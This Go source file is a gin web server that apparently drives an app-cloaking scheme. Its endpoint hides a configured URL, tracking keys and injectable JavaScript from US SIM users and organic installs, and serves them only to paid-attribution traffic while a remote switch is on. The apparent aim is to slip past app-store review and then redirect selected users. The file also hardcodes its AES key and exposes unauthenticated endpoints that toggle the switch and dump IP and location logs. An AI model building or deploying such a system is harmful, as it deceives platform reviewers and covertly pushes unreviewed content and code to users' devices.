/*
 * @Author: xx
 * @Date: 2023-03-17 16:25:35
 * @LastEditTime: 2023-08-21 11:45:01
 * @Description:
 */
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/oschwald/geoip2-golang"
)

var kk = []byte("41285367890174956739012382148901")

// GameConfig 游戏配置结构体
type GameConfig struct {
	Url             string `json:"url"`
	AFKey           string `json:"AFKey"`
	AdjustToken     string `json:"AdjustToken"`
	Orientation     string `json:"Orientation"`
	JSInterfaceName string `json:"JSInterfaceName"`
	IsOpen          bool   `json:"isOpen"`
}

// type Config map[string]GameConfig

// 定义一个结构体来映射JSON文件的内容
type Config struct {
	Origin map[string]string `json:"origin"`
	Target map[string]string `json:"target"`
}

var configMap Config

var ipCityDB *geoip2.Reader

func main() {

	//加密处理
	err := encryptConfig("./config.json")
	if err != nil {
		fmt.Println("Error:", err)
	}

	// 读取ip库
	readIpConfig()

	// 创建gin实例
	router := gin.Default()

	// 设置路由
	router.GET("/set", setHandler)
	router.GET("/showlog", showlogHandler)
	router.GET("/reloadCfg", reloadCfg)

	router.POST("/PKVNKE", requestData)

	// 启动http服务
	router.Run("0.0.0.0:8089")
}

func requestData(c *gin.Context) {
	var requestData []string
	if err := c.ShouldBindJSON(&requestData); err != nil {
		fmt.Println("Error parsing JSON:", err)
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON data"})
		return
	}

	var decryptData []string
	for _, value := range requestData {
		encryptedValue := decrypt(value) // 使用你的加密函数
		fmt.Println("请求数据-- " + encryptedValue)
		decryptData = append(decryptData, encryptedValue)
	}

	// 处理数据
	if len(decryptData) <= 0 {
		decryptData = append(decryptData, "没有带参数请求")
		logRequest(c.Request, decryptData)
		c.JSON(http.StatusOK, nil)
		return
	}

	if len(decryptData) >= 1 && strings.ToUpper(decryptData[0]) == "US" {
		decryptData = append(decryptData, "美国手机卡")
		logRequest(c.Request, decryptData)
		c.JSON(http.StatusOK, "")
		return
	}

	// if len(decryptData) >= 2 && decryptData[1] == "" {
	// 	decryptData = append(decryptData, "InstallerPackageName包为空")
	// 	logRequest(c.Request, decryptData)
	// 	c.JSON(http.StatusOK, "")
	// 	return
	// }

	if len(decryptData) >= 3 && decryptData[2] == "" {
		decryptData = append(decryptData, "包名为空")
		logRequest(c.Request, decryptData)
		c.JSON(http.StatusOK, "")
		return
	}

	//自然流量 不打开
	if len(decryptData) >= 4 {
		// 定义正则表达式，匹配 utm_medium= 后面的值
		re := regexp.MustCompile(`utm_medium=([^&]+)`)
		match := re.FindStringSubmatch(decryptData[3])

		utmMediumValue := ""
		if len(match) >= 2 {
			utmMediumValue = match[1]
			fmt.Println("归因 utm_medium 匹配值 :", utmMediumValue)
		}

		if utmMediumValue == "" || utmMediumValue == "organic" {
			decryptData = append(decryptData, "自然流量")
			logRequest(c.Request, decryptData)
			c.JSON(http.StatusOK, "")
			return
		}
	}

	if configMap.Origin["isOpen"] != "true" {
		decryptData = append(decryptData, "正常请求，没有开启")
		logRequest(c.Request, decryptData)
		c.JSON(http.StatusOK, "")
		return
	}
	// 返回响应数据
	responseData := []string{
		configMap.Target["url"],
		configMap.Target["afKey"],
		configMap.Target["currency"],
		configMap.Target["orientation"],
		configMap.Target["ajToken"],
		configMap.Target["jsCode"],
		configMap.Target["jsInterface"],
		configMap.Target["onActivityResultCode"],
	}
	c.JSON(http.StatusOK, responseData)
	//记录
	logRequest(c.Request, decryptData)
}

// 读取配置文件
func readConfig() {
	filePtr, err := os.Open("./config.json")
	if err != nil {
		fmt.Print(err)
		return
	}
	defer filePtr.Close()

	decoder := json.NewDecoder(filePtr)
	err = decoder.Decode(&configMap)
	if err != nil {
		fmt.Print(err)
		return
	}

	fmt.Print("config loaded")
}

// 加密配置
func encryptConfig(filename string) error {
	// 读取配置文件内容
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}

	// 解析JSON数据
	err = json.Unmarshal(data, &configMap)
	if err != nil {
		return err
	}

	// 调用加密函数对 Origin 中的值进行加密，然后存入 Target
	for key, value := range configMap.Origin {
		encryptedValue := encrypt(value) // 使用你的加密函数
		configMap.Target[key] = encryptedValue
	}

	// 将更新后的配置写回到文件中
	updatedData, err := json.MarshalIndent(configMap, "", "  ")
	if err != nil {
		return err
	}

	err = ioutil.WriteFile(filename, updatedData, 0644)
	if err != nil {
		return err
	}

	return nil
}

func readIpConfig() {
	var err error

	ipCityDB, err = geoip2.Open("./GeoLite2-City.mmdb")
	if err != nil {
		log.Fatal(err)
	}
}

// 重载配置
func reloadCfg(c *gin.Context) {
	// readConfig()
	err := encryptConfig("./config.json")
	if err != nil {
		fmt.Println("Error:", err)
	}
	c.JSON(http.StatusOK, configMap)
}

// 返回日志
func showlogHandler(c *gin.Context) {
	fileBody, err := ioutil.ReadFile("log.txt")
	if err != nil {
		log.Fatal(err)
		c.JSON(http.StatusInternalServerError, gin.H{
			"message": "Error reading log file",
		})
		return
	}

	c.Data(http.StatusOK, "text/plain; charset=utf-8", fileBody)
}

// set请求处理函数
func setHandler(c *gin.Context) {
	// 获取参数
	open := c.Query("open")

	configMap.Origin["isOpen"] = open

	// 保存配置文件
	saveConfig()

	// 返回结果
	c.JSON(http.StatusOK, gin.H{
		"message": fmt.Sprintf("设置了isOpen == '%s'", open),
	})
}

// 记录访问日志
func logRequest(req *http.Request, mark []string) {
	remoteAddr, err := getRemoteIP(req)
	if err != nil {
		fmt.Print(err)
		return
	}

	country, city := getIPCode(remoteAddr)
	if err != nil {
		fmt.Print(err)
		return
	}

	logText := fmt.Sprintf("[%s]  %s  %s  %s  %s", time.Now().Format("2006-01-02 15:04:05"), remoteAddr, country, city, req.URL.Path)

	for _, v := range mark {
		// fmt.Println("v -- " + v + "\n" + " 解密后-- " + decrypt(decrypt(v)))
		logText += (" " + v)
	}
	logText += "\n"
	fmt.Print(logText)

	// 打开或创建 log.txt 文件，以追加写入的方式打开
	file, err := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open log file: %v\n", err)
		return
	}
	defer file.Close()

	// 使用 file.Write() 函数进行写入
	_, err = file.Write([]byte(logText))
	if err != nil {
		fmt.Printf("Failed to write log file: %v\n", err)
	}
}

// 获取访问ip
func getRemoteIP(req *http.Request) (string, error) {
	remoteAddr := req.RemoteAddr
	if ip, _, err := net.SplitHostPort(remoteAddr); err == nil {
		remoteAddr = ip
	} else {
		return "", err
	}
	ip := net.ParseIP(remoteAddr)
	if ip == nil {
		return "", fmt.Errorf("invalid remote ip: %s", remoteAddr)
	}
	return ip.String(), nil
}

// 获取城市代码
func getIPCode(ip string) (string, string) {
	if ip == "127.0.0.1" || strings.HasPrefix(ip, "192.168.") {
		return "本地", "localhost"
	}
	ipParse := net.ParseIP(ip)
	record, err := ipCityDB.City(ipParse)
	if err != nil {
		log.Fatal(err)
	}
	return record.Country.Names["zh-CN"], record.City.Names["en"]
}

// 保存配置文件
func saveConfig() {

	bytes, err := json.MarshalIndent(configMap, "", "  ")
	if err != nil {
		return
	}

	err = ioutil.WriteFile("config.json", bytes, 0644)
	if err != nil {
		return
	}
	fmt.Print("config saved")

}

// 加密
func encrypt(plainText string) string {
	block, err := aes.NewCipher(kk)
	if err != nil {
		fmt.Println("Error creating AES cipher:", err)
		return ""
	}

	plainTextByte := []byte(plainText)
	ciphertext := make([]byte, aes.BlockSize+len(plainTextByte))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println("Error generating IV:", err)
		return ""
	}
	cfbEncrypter := cipher.NewCFBEncrypter(block, iv)
	cfbEncrypter.XORKeyStream(ciphertext[aes.BlockSize:], plainTextByte)

	decodedBytes := base64.StdEncoding.EncodeToString(ciphertext)

	return decodedBytes
}

// 解密
func decrypt(ciphertext string) string {
	block, err := aes.NewCipher(kk)
	if err != nil {
		fmt.Println("Error creating AES cipher:", err)
		return ""
	}

	decodeStr, _ := base64.StdEncoding.DecodeString(ciphertext)

	ciphertextBytes := []byte(decodeStr)

	iv := ciphertextBytes[:aes.BlockSize]
	cfbDecrypter := cipher.NewCFBDecrypter(block, iv)
	decryptedText := make([]byte, len(ciphertextBytes)-aes.BlockSize)
	cfbDecrypter.XORKeyStream(decryptedText, ciphertextBytes[aes.BlockSize:])

	return string(decryptedText)
}
